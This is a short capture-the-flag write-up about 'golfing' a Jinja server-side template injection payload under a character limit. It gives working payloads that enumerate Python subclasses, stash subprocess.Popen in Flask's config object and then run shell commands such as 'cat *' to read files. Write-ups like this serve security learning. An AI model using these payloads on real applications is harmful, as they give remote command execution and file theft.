# SSTI golfing 

A code golfing challenge for SSTI!

## Restrictions

The server filters out a lot of good stuff, like `__builtins__` and `lipsum` (used by HackMD) :(

There’s also a 65 character limit on input, which rules out most psyloads. 

## Bypassing

Someone managed to drop `__builtins__` into an entry in Flask’s config global object (which I happened to see before FS reset it), but my solution is a *bit* less complicated :P

[niebardzo's SSTI payloads article](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/) was an interesting read, but ultimately unneeded.

Since we have to golf, we can do `{{dict.mro()[1].__subclasses__()}}` (34 char) as opposed to `{{''.__class__.mro()[1].__subclasses__()}}` or similar, as other guides do) to get the list of available classes.

Of interest (to me) was `subprocess.Popen` (at index 351) which would let me spawn a subprocess like `cat`. Unfortunately, a direct `Popen` payload is too long :(

So, what we can do is drop `subprocess.Popen` into a random field of the Flask global config object with something like `{{config.update(a=dict.mro()[1].__subclasses__()[351])}}`!

Then, we can just do `{{config.a('cat *',shell=1,stdout=-1).communicate()}}` and profit! (used `cat flag.txt`

(Apparently intended solution involved breakng the payload into pieces like [this method](), so it's not really golfing)

Fun fact: you can add files to the server. Thankfully, FS confirmed that the flag is write-protected.
